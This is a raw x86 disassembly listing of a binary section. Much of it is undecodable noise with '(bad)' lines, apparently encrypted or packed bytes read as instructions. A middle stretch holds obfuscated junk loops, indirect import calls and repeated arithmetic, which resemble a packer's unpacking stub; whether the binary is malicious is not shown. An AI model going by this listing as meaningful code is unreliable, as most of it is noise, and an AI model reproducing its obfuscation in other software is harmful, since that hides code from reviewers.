  413146:	fs fsub st,st(5)
  413149:	mov    edi,0x7cc657d1
  41314e:	push   cs
  41314f:	xchg   esp,eax
  413150:	mov    al,ds:0x25d96063
  413155:	(bad)  
  413156:	loopne 0x4130f4
  413158:	push   ebx
  413159:	int    0x8b
  41315b:	push   0x78b7eb73
  413160:	sbb    cl,BYTE PTR [edx+eiz*2-0x61]
  413164:	cmp    al,0x68
  413166:	icebp  
  413167:	jmp    0xb7f50fdf
  41316c:	dec    esp
  41316d:	jb     0x4131c4
  41316f:	xor    ah,BYTE PTR [ecx+0x747a692f]
  413175:	rcl    DWORD PTR [ebp+0x31],1
  413178:	loopne 0x4131aa
  41317a:	mov    bh,0xd4
  41317c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41317d:	stos   BYTE PTR es:[edi],al
  41317e:	fild   QWORD PTR [eax]
  413180:	or     edx,DWORD PTR [ebx-0x46]
  413183:	or     BYTE PTR [eax-0x2b],ah
  413186:	xchg   ebx,eax
  413187:	stos   BYTE PTR es:[edi],al
  413188:	ins    BYTE PTR es:[edi],dx
  413189:	jno    0x41319d
  41318b:	ret    
  41318c:	(bad)  
  41318d:	jecxz  0x4131c4
  41318f:	fs or  al,0x2a
  413192:	(bad)  
  413193:	mov    eax,ds:0x412622a1
  413198:	pop    esi
  413199:	repnz cmp eax,0x92606a06
  41319f:	std    
  4131a0:	enter  0xd21c,0x92
  4131a4:	jecxz  0x41314e
  4131a6:	dec    eax
  4131a7:	add    BYTE PTR [edi+0x6d760c6],bl
  4131ad:	adc    al,0xc4
  4131af:	xchg   DWORD PTR [esi+0x7b],ecx
  4131b2:	sub    esi,ecx
  4131b4:	sbb    eax,0x43466022
  4131b9:	jmp    0x4131ec
  4131bb:	and    eax,0x61c92263
  4131c0:	call   0xa394:0x2c7ed519
  4131c7:	imul   ecx,DWORD PTR [edi-0x3d5062bb],0xdd629c91
  4131d1:	xchg   edx,eax
  4131d2:	mov    ch,BYTE PTR [edi+0x6a]
  4131d5:	add    eax,0x424f9712
  4131da:	shr    DWORD PTR [ecx-0x1e],1
  4131dd:	add    edi,ecx
  4131df:	cdq    
  4131e0:	cdq    
  4131e1:	push   0x70
  4131e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131e4:	les    esp,FWORD PTR [eax-0x7f]
  4131e7:	and    esp,edi
  4131e9:	cwde   
  4131ea:	sbb    esp,DWORD PTR [esi+0x2ef45757]
  4131f0:	and    al,0xb4
  4131f2:	shl    DWORD PTR [ebp+0x1bcbd751],cl
  4131f8:	inc    eax
  4131f9:	ds enter 0xc83d,0xe6
  4131fe:	enter  0x2e10,0xb5
  413202:	lods   eax,DWORD PTR ds:[esi]
  413203:	int3   
  413204:	repnz fs push cs
  413207:	lock int 0xbf
  41320a:	daa    
  41320b:	bound  eax,QWORD PTR [ebx]
  41320d:	jb     0x413200
  41320f:	adc    dl,bh
  413211:	mov    WORD PTR [eax+ebp*4],ds
  413214:	inc    ebp
  413215:	xchg   edx,eax
  413216:	repz and cl,BYTE PTR [eax-0x53394cda]
  41321d:	xlat   BYTE PTR ds:[ebx]
  41321e:	cmp    ebp,DWORD PTR [edx+0x6e883fe6]
  413224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413225:	rcr    BYTE PTR [ebx+0x41bd1eb2],1
  41322b:	sbb    edi,esi
  41322d:	mov    ds:0x59a63b06,eax
  413232:	repnz xchg esi,eax
  413234:	mov    ebx,0xae097249
  413239:	call   0xfcdf97c3
  41323e:	cmc    
  41323f:	sbb    eax,0xae72dfaf
  413244:	fisubr DWORD PTR [esp+esi*1+0x384f149a]
  41324b:	jl     0x413220
  41324d:	js     0x413242
  41324f:	xor    BYTE PTR [edx-0x4e],dh
  413252:	retf   
  413253:	dec    ebx
  413254:	add    BYTE PTR [edx+0x36c0923e],0xdb
  41325b:	push   ds
  41325c:	mov    edx,0x9f544e35
  413262:	dec    ebp
  413263:	push   esp
  413264:	mov    eax,0xc6588ed4
  413269:	icebp  
  41326a:	ds ret 0x967d
  41326e:	cld    
  41326f:	nop
  413270:	mov    dl,0xb7
  413272:	test   al,0x98
  413274:	mov    WORD PTR [edx],cs
  413276:	and    eax,0x28708cbd
  41327b:	in     eax,dx
  41327c:	jmp    0x3b5d:0xd4d7fd71
  413283:	push   esi
  413284:	shr    ch,1
  413286:	jecxz  0x413299
  413288:	imul   edx,DWORD PTR [ebx-0x3ffad65d],0xde976915
  413292:	xor    bl,al
  413294:	cs xor ah,dh
  413297:	xchg   BYTE PTR [edx],bl
  413299:	sbb    bl,BYTE PTR [esi]
  41329b:	fsub   DWORD PTR ds:0xf5668a01
  4132a1:	loop   0x41325a
  4132a3:	addr16 pop es
  4132a5:	inc    edi
  4132a6:	fdiv   QWORD PTR [ebp+0x1717356]
  4132ac:	or     al,0x30
  4132ae:	adc    eax,edx
  4132b0:	xor    eax,0xe7bc4531
  4132b5:	mov    ah,0x21
  4132b7:	jl     0x41327a
  4132b9:	and    eax,0xcd1dd75
  4132be:	out    dx,al
  4132bf:	dec    edx
  4132c0:	mov    cl,0x9e
  4132c2:	pop    esi
  4132c3:	pop    edx
  4132c4:	xchg   ebx,eax
  4132c5:	inc    esp
  4132c6:	mov    al,0xbe
  4132c8:	inc    esi
  4132c9:	mov    eax,0x87e57d2f
  4132ce:	pop    edi
  4132cf:	fnop   
  4132d1:	and    eax,DWORD PTR [edx-0x15]
  4132d4:	addr16 mov ebx,0xcfe5e5dc
  4132da:	add    esp,ecx
  4132dc:	call   0xf242706d
  4132e1:	xchg   esi,eax
  4132e2:	mov    al,ds:0x708d9e4c
  4132e7:	cmp    eax,0x2e21c3ca
  4132ec:	imul   ebp,DWORD PTR [ebp-0x7],0xffffff94
  4132f0:	ds inc esp
  4132f2:	pop    ebx
  4132f3:	in     eax,0x13
  4132f5:	xchg   esp,eax
  4132f6:	ret    
  4132f7:	das    
  4132f8:	aas    
  4132f9:	jnp    0x41329b
  4132fb:	loope  0x413310
  4132fd:	adc    DWORD PTR [ecx],0x18276b4a
  413303:	adc    al,0xd6
  413305:	jle    0x4132ba
  413307:	cmp    eax,0xcab737ec
  41330c:	jns    0x4132e9
  41330e:	and    esi,DWORD PTR [edx]
  413310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413311:	xchg   DWORD PTR [ecx+edi*4-0x5d],edx
  413315:	imul   edx,ebx,0x7657a175
  41331b:	adc    eax,DWORD PTR [eax]
  41331d:	or     ah,BYTE PTR gs:[esp+edi*8-0x52a0d925]
  413325:	daa    
  413326:	adc    ebp,DWORD PTR [edx+0x60f87e86]
  41332c:	imul   esi,DWORD PTR [ebx],0x5a888be8
  413332:	xchg   esi,eax
  413333:	enter  0x8445,0x5e
  413337:	loop   0x4132c5
  413339:	out    0xf1,eax
  41333b:	das    
  41333c:	xchg   esi,eax
  41333d:	mov    DWORD PTR [edx],ecx
  41333f:	mov    DWORD PTR ds:0x420e8e,0x16
  413349:	cmp    DWORD PTR ds:0x420e8e,0x0
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	popa   
  413706:	mov    cl,BYTE PTR [ecx+0x7a73be41]
  41370c:	jp     0x413718
  41370e:	pop    edi
  41370f:	jp     0x41378b
  413711:	mov    ebp,0x694175ea
  413716:	push   cs
  413717:	add    DWORD PTR [ecx+0x299b8759],0xfffffff5
  41371e:	pushf  
  41371f:	sub    eax,0xe77eeef6
  413724:	test   BYTE PTR [ecx],ch
  413726:	imul   esi,ebx,0xbba3f51b
  41372c:	mov    dl,0x7b
  41372e:	pop    esi
  41372f:	fnstsw WORD PTR [ebx+0x2f0b63a2]
  413735:	xchg   ebx,eax
  413736:	cs jo  0x413787
  413739:	jle    0x413770
  41373b:	mov    ds:0x3e2052d4,eax
  413740:	pop    ds
  413741:	hlt    
  413742:	jne    0x4136e4
  413744:	ficom  DWORD PTR [esi+0x54bbdd2c]
  41374a:	and    BYTE PTR [edi+0x44947edb],ch
  413750:	and    ah,ah
  413752:	jno    0x413740
  413754:	(bad)  
  413755:	cld    
  413756:	xchg   edi,eax
  413757:	fsubr  QWORD PTR [ebx+eax*1+0x42d00549]
  41375e:	neg    BYTE PTR [edi-0x68ba0543]
  413764:	je     0x41372f
  413766:	aas    
  413767:	lahf   
  413768:	cmp    al,0x70
  41376a:	inc    ebp
  41376b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41376c:	test   al,0xba
  41376e:	mov    ecx,DWORD PTR [esi+0x3]
  413771:	pop    esp
  413772:	popf   
  413773:	popf   
  413774:	popf   
  413775:	aas    
  413776:	rol    DWORD PTR [eax],cl
  413778:	push   ebp
  413779:	cmp    BYTE PTR [ebx+eax*8],ch
  41377c:	test   eax,0x329239db
  413781:	push   edx
  413782:	cli    
  413783:	dec    esi
  413784:	sub    ebp,DWORD PTR [eax+ecx*2+0x325e00ea]
  41378b:	int    0x77
  41378d:	dec    edx
  41378e:	pop    ds
  41378f:	loope  0x41377a
  413791:	call   DWORD PTR [ebx]
  413793:	adc    DWORD PTR [ebx],ecx
  413795:	push   ebp
  413796:	lea    ebp,[edi+0xf5ce10e]
  41379c:	jmp    0xd739:0x8d89fe1f
  4137a3:	pop    ecx
  4137a4:	(bad)  
  4137a5:	in     al,0xd4
  4137a7:	enter  0x4a1e,0xcb
  4137ab:	in     eax,dx
  4137ac:	ins    DWORD PTR es:[edi],dx
  4137ad:	and    DWORD PTR [edx-0x58c6a050],edi
  4137b3:	aas    
  4137b4:	mov    BYTE PTR [eax],dh
  4137b6:	int    0xc8
  4137b8:	fwait
  4137b9:	test   DWORD PTR ds:0xf5f0a1b0,edi
  4137bf:	lea    edx,[eax+eiz*8]
  4137c2:	imul   esp,DWORD PTR [eax],0x6d93c99f
  4137c8:	mov    ecx,edi
  4137ca:	or     eax,DWORD PTR [esi]
  4137cc:	xchg   esp,eax
  4137cd:	hlt    
  4137ce:	lds    edx,FWORD PTR [esi-0x6d428b48]
  4137d4:	mov    ecx,0xc1f7cb6a
  4137d9:	lahf   
  4137da:	jbe    0x413838
  4137dc:	out    dx,al
  4137dd:	xor    edi,edi
  4137df:	out    0x20,al
  4137e1:	mov    al,0x70
  4137e3:	fidiv  DWORD PTR [edx]
  4137e5:	lea    edi,[eax+eiz*8+0x3d]
  4137e9:	push   ss
  4137ea:	xor    BYTE PTR [edi+0x3267d3b1],0x30
  4137f1:	cmp    al,0x7b
  4137f3:	push   cs
  4137f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137f5:	(bad)  
  4137f6:	loopne 0x413807
  4137f8:	cmp    ebp,DWORD PTR [ebx]
  4137fa:	out    dx,al
  4137fb:	cmp    ebx,edi
  4137fd:	pop    esp
  4137fe:	(bad)  
  4137ff:	jg     0x41381a
  413801:	aad    0xd5
  413803:	push   ebx
  413804:	jl     0x413859
  413806:	je     0x413864
  413808:	aas    
  413809:	jno    0x4137a9
  41380b:	(bad)  
  41380c:	int3   
  41380d:	in     al,0xb0
  41380f:	pop    eax
  413810:	ja     0x4137d4
  413812:	push   esi
  413813:	ffreep st(3)
  413815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413816:	or     esi,DWORD PTR [eax+ebx*1+0x5b]
  41381a:	jle    0x413815
  41381c:	mov    eax,ds:0xe32f3c0b
  413821:	sbb    BYTE PTR [eax+0x70],0xc
  413825:	hlt    
  413826:	fild   DWORD PTR [ecx]
  413828:	or     al,BYTE PTR [esp+esi*8+0x44c1b9eb]
  41382f:	cld    
  413830:	sub    al,0x8e
  413832:	dec    edi
  413833:	out    0x7,al
  413835:	sbb    al,0x93
  413837:	cli    
  413838:	sti    
  413839:	outs   dx,BYTE PTR ds:[esi]
  41383a:	aas    
  41383b:	jge    0x4137e4
  41383d:	in     al,0xac
  41383f:	push   ss
  413840:	push   0x2c
  413842:	jp     0x4138c0
  413844:	and    ebx,DWORD PTR [ebp-0x3b7acdca]
  41384a:	dec    esi
  41384b:	mov    ds:0xc8fdfd58,eax
  413850:	adc    DWORD PTR [ecx-0x7e],edi
  413853:	jnp    0x41383c
  413855:	ret    
  413856:	test   eax,0xfdf5bbf1
  41385b:	sbb    eax,ecx
  41385d:	das    
  41385e:	sbb    eax,DWORD PTR [ebp+0x3d2fd3eb]
  413864:	push   es
  413865:	push   ds
  413866:	dec    ebx
  413867:	fdivr  QWORD PTR [ebp+ebx*8+0x24]
  41386b:	jg     0x4137f0
  41386d:	mov    edx,DWORD PTR [edx+0x6d]
  413870:	push   esi
  413871:	mov    ch,0x29
  413873:	dec    edi
  413874:	ud2    
  413876:	sub    BYTE PTR [edi+0x5e],dl
  413879:	rcr    BYTE PTR ds:0xe5b2e24d,1
  41387f:	mov    ss,ecx
  413881:	mov    ch,0xac
  413883:	scas   eax,DWORD PTR es:[edi]
  413884:	sub    BYTE PTR [esi-0x47e0e9c2],al
  41388a:	xor    eax,0x6dfe0c0a
  41388f:	push   ss
  413890:	or     ch,BYTE PTR [esi+ecx*8+0x4]
  413894:	into   
  413895:	sbb    dl,bh
  413897:	or     BYTE PTR [edi+ebp*2-0x699906aa],0x9c
  41389f:	in     al,dx
  4138a0:	sbb    eax,0xc57abe02
  4138a5:	adc    eax,0x547df1ef
  4138aa:	mul    ebx
  4138ac:	(bad)  
  4138ad:	std    
  4138ae:	test   al,0x90
  4138b0:	call   0x7259c467
  4138b5:	shr    DWORD PTR [ebx-0x28],cl
  4138b8:	mov    al,ds:0x9c8a1351
  4138bd:	push   edi
  4138be:	push   ss
  4138bf:	mov    ah,0xa0
  4138c1:	lds    ebp,FWORD PTR [ecx]
  4138c3:	dec    ebp
  4138c4:	test   eax,0x3bae1ccb
  4138c9:	ja     0x4138f1
  4138cb:	inc    esp
  4138cc:	mov    eax,ds:0x52362ba6
  4138d1:	push   ds
  4138d2:	into   
  4138d3:	addr16 mov bh,0x2d
  4138d6:	jne    0x4138d9
  4138d8:	xchg   edi,esi
  4138da:	cmp    eax,DWORD PTR [eax-0x4d043b66]
  4138e0:	test   DWORD PTR [ebx+0x42],edi
  4138e3:	lods   eax,DWORD PTR ds:[esi]
  4138e4:	int    0xb2
  4138e6:	mov    eax,0xb83ec5f3
  4138eb:	mov    edx,gs
  4138ed:	addr16 inc ebx
  4138ef:	or     ax,0x6f7d
  4138f3:	sub    ah,cl
  4138f5:	ss push ebx
  4138f7:	inc    ebx
  4138f8:	pop    eax
  4138f9:	mov    edx,0x315c0a27
  4138fe:	enter  0x4ae6,0x19
  413902:	ds cwde 
  413904:	ins    DWORD PTR es:[edi],dx
  413905:	xor    bl,dh
  413907:	xchg   edx,eax
  413908:	mov    cl,0xbb
  41390a:	les    ecx,FWORD PTR [eax+edx*2]
  41390d:	jnp    0x413937
  41390f:	fwait
  413910:	and    al,dh
  413912:	xchg   ebp,eax
  413913:	cdq    
  413914:	or     ah,cl
  413916:	add    ah,cl
  413918:	cmp    al,0x62
  41391a:	adc    al,0x8b
  41391c:	leave  
  41391d:	repz or eax,0x48360344
  413923:	pop    esp
  413924:	lds    esi,FWORD PTR [esi+0x74648307]
  41392a:	sbb    esp,DWORD PTR [edx]
  41392c:	jbe    0x4138d5
  41392e:	xor    dh,al
  413930:	ja     0x41397d
  413932:	sub    eax,0xc9744fd5
  413937:	mov    eax,ds:0x65a07a84
  41393c:	fsubp  st(0),st
  41393e:	popa   
  41393f:	ss inc esi
  413941:	xchg   ecx,eax
  413942:	jle    0x413982
  413944:	jae    0x4138c6
  413946:	add    BYTE PTR [ebp+0x4c1bbcb6],bh
  41394c:	jns    0x41398e
  41394e:	fidiv  DWORD PTR [ebx+0x12814c83]
  413954:	jg     0x41399e
  413956:	sbb    bl,BYTE PTR [esi+0x4]
  413959:	repnz mov ds,WORD PTR [edi-0x39]
  41395d:	mov    bh,BYTE PTR [esi-0x54]
  413960:	aad    0x2a
  413962:	mov    al,ds:0xf09e0c0a
  413967:	sbb    DWORD PTR [eax],esp
  413969:	fldcw  WORD PTR [eax]
  41396b:	push   cs
  41396c:	jge    0x41395d
  41396e:	fmul   st(0),st
  413970:	mov    ch,0xcb
  413972:	xchg   esi,eax
  413973:	and    cl,BYTE PTR [ebx+0x302189dd]
  413979:	mov    al,ds:0xf06eb6c4
  41397e:	add    ebx,DWORD PTR [eax-0x699edd42]
  413984:	lock add BYTE PTR [ebp+0x4bfbe719],dh
  41398b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41398c:	(bad)  
  41398d:	mov    dl,0xdd
  41398f:	sbb    bl,BYTE PTR [esi]
  413991:	jg     0x4139c4
  413993:	cmp    eax,0xb7a91760
  413998:	pop    ecx
  413999:	loop   0x41392f
  41399b:	jno    0x4139fd
  41399d:	ins    DWORD PTR es:[edi],dx
  41399e:	push   es
  41399f:	nop
  4139a0:	push   esi
  4139a1:	adc    al,0xc
  4139a3:	cmp    DWORD PTR [esi+0x50fffbee],ebx
  4139a9:	and    eax,DWORD PTR [esi-0x668747e9]
  4139af:	push   edi
  4139b0:	scas   eax,DWORD PTR es:[edi]
  4139b1:	int    0x1d
  4139b3:	pop    ds
  4139b4:	mov    ah,0x9
  4139b6:	dec    edx
  4139b7:	test   dh,cl
  4139b9:	shl    DWORD PTR [esp+edx*8+0x45b87bd6],cl
  4139c0:	outs   dx,DWORD PTR ds:[esi]
  4139c1:	jl     0x413a3f
  4139c3:	fucomp st(2)
  4139c5:	jne    0x413964
  4139c7:	mov    bl,0xde
  4139c9:	cmp    DWORD PTR [edi+0x38c47730],ebp
  4139cf:	das    
  4139d0:	div    edi
  4139d2:	retf   0xe279
  4139d5:	daa    
  4139d6:	cmp    eax,0x3aa4eea9
  4139db:	cmp    al,0x2a
  4139dd:	fcmovu st,st(6)
  4139df:	pop    ds
  4139e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139e1:	cs out 0x85,al
  4139e4:	dec    eax
  4139e5:	sub    ch,dh
  4139e7:	jno    0x413a3c
  4139e9:	push   ebp
  4139ea:	or     dh,BYTE PTR [ecx-0x349488a1]
  4139f0:	test   DWORD PTR [edi+0x70],esi
  4139f3:	cdq    
  4139f4:	xlat   BYTE PTR ds:[ebx]
  4139f5:	aad    0x99
  4139f7:	out    dx,eax
  4139f8:	add    BYTE PTR [edx-0x4a8a579a],dh
  4139fe:	mov    ecx,0x6f473530
  413a03:	lds    ecx,FWORD PTR [ebp-0x1b5ae8c0]
  413a09:	dec    eax
  413a0a:	mov    eax,ds:0x162901a1
  413a0f:	or     eax,0xf763de17
  413a14:	out    0x2b,eax
  413a16:	stos   DWORD PTR es:[edi],eax
  413a17:	inc    edx
  413a18:	test   DWORD PTR [eax+0x5b],0xab171538
  413a1f:	push   es
  413a20:	pop    esp
  413a21:	push   esi
  413a22:	(bad)  
  413a23:	pop    ecx
  413a24:	mov    eax,0x9fe7718a
  413a29:	adc    eax,0x666aef97
  413a2e:	push   es
  413a2f:	sar    edx,cl
  413a31:	push   ss
  413a32:	sbb    esi,DWORD PTR [edi-0x535c6032]
  413a38:	je     0x4139c7
  413a3a:	sbb    eax,DWORD PTR [eax+eiz*2-0x4a]
  413a3e:	mov    al,0x4e
  413a40:	mov    esi,0xe9b5df4d
  413a45:	push   ds
  413a46:	adc    al,0xa2
  413a48:	and    ecx,DWORD PTR [edx-0x4e]
  413a4b:	and    ah,ch
  413a4d:	push   ds
  413a4e:	jo     0x413a73
  413a50:	jmp    0x413a28
  413a52:	adc    BYTE PTR [esi-0x1a],dl
  413a55:	pop    ds
  413a56:	push   esp
  413a57:	mov    dh,0xf4
  413a59:	jge    0x413acb
  413a5b:	rcr    ebx,1
  413a5d:	pop    edx
  413a5e:	pop    ss
  413a5f:	jnp    0x413abe
  413a61:	cli    
  413a62:	into   
  413a63:	inc    esp
  413a64:	icebp  
  413a65:	clc    
  413a66:	xor    DWORD PTR [ebp-0x13],edx
  413a69:	xchg   edi,eax
  413a6a:	jno    0x413a02
  413a6c:	(bad)  
  413a6e:	adc    dl,BYTE PTR [edx-0x61e69558]
  413a74:	xchg   esp,eax
  413a75:	push   es
  413a76:	push   esi
  413a77:	stc    
  413a78:	jl     0x413ad9
  413a7a:	mov    edx,0x407bd314
  413a7f:	sub    edx,DWORD PTR [ebx+esi*8+0x1]
  413a83:	jg     0x413aea
  413a85:	xor    al,0x8
  413a87:	jle    0x413adf
  413a89:	arpl   si,si
  413a8b:	sahf   
  413a8c:	adc    al,0xe2
  413a8e:	aad    0xf1
  413a90:	push   ds
  413a91:	std    
